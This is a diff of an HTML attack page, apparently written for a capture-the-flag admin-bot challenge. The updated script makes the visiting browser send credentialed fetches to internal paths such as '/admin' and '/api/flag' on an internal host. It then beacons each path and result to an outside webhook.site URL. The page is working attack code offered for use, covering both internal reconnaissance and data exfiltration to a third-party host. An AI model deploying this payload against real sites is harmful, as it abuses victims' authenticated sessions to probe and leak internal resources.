@@ -1,29 +1,51 @@
 
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>SitePreview Probe</title>
+<meta charset="UTF-8">
+<title>Site Preview Admin Probe</title>
 </head>
 <body>
+<h1>Review Test</h1>
 <script>
 const hook = "https://webhook.site/676ec5ae-a5f2-49f7-8044-21c48e3f6a35";
 
-function report(result) {
-  new Image().src =
-    hook + "?probe=" + encodeURIComponent(result);
+const paths = [
+  "/",
+  "/admin",
+  "/api/admin",
+  "/api/flag",
+  "/flag",
+  "/dashboard",
+  "/login"
+];
+
+function report(path, result) {
+  const url = new URL(hook);
+  url.searchParams.set("path", path);
+  url.searchParams.set("result", result);
+  navigator.sendBeacon(url.toString());
 }
 
-const frame = document.createElement("iframe");
-frame.style.display = "none";
+async function test(path) {
+  const target = "http://web:3000" + path;
+  try {
+    const response = await fetch(target, {
+      mode: "no-cors",
+      credentials: "include",
+      cache: "no-store",
+      signal: AbortSignal.timeout(4000)
+    });
 
-frame.onload = () => report("iframe-loaded");
-frame.onerror = () => report("iframe-error");
+    report(path, "resolved-" + response.type);
+  } catch (e) {
+    report(path, "error-" + e.name);
+  }
+}
 
-frame.src = "http://web:3000/";
-document.body.appendChild(frame);
-
-setTimeout(() => report("probe-finished"), 5000);
+Promise.all(paths.map(test)).then(() => {
+  report("complete", "done");
+});
 </script>
 </body>
 </html>
